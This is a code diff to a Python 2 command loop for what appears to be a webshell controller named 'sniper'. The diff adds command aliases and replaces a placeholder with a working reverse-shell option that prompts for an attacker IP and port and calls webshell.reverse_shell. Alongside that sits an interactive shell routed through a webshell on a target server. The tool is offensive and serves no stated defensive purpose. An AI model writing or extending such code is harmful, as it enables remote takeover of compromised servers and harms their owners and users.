@@ -20,11 +20,10 @@ def show_help():
 
 def main_help():
     print "Commands : "
-    print "        1. h : show this help"
-    print "        2. sh : start an interactive shell"
-    print "        3. rsh : start an reverse shell"
-    print "                rsh [IP] [PORT]"
-    print "        4. q : quit"
+    print "        1. [h|help|?] : show this help"
+    print "        2. [sh|shell] : start an interactive shell"
+    print "        3. [rsh|rshell] : start an reverse shell"
+    print "        4. [q|quit|exit] : quit"
 
 def main():
     if len(sys.argv) != 4:
@@ -38,17 +37,23 @@ def main():
         Log.error("The webshell cannot work...")
         exit(2)
 
+    main_help()
+
     while True:
         Log.context("sniper")
-        context = raw_input("=>")
-        if string.lower(context) == "h":
+        context = string.lower(raw_input("=>"))
+        if context == "h" or context == "help" or context == "?":
             main_help()
-        elif string.lower(context) == "sh":
+        elif context == "sh" or context == "shell":
             shell = Shell(webshell)
             shell.interactive()
-        elif string.lower(context) == "rsh":
-            Log.warning("Developing...")
-        elif string.lower(context) == "q":
+        elif context == "rsh" or context == "rshell":
+            ip = raw_input("[IP] : ")
+            port = raw_input("[PORT] : ")
+            Log.info("Starting reverse shell (%s:%s)" % (ip, port))
+            webshell.reverse_shell(ip, port)
+        elif context == "q" or context == "quit" or context == "exit":
+            Log.info("Quiting...")
             break
         else:
             Log.error("Unsupported command!")
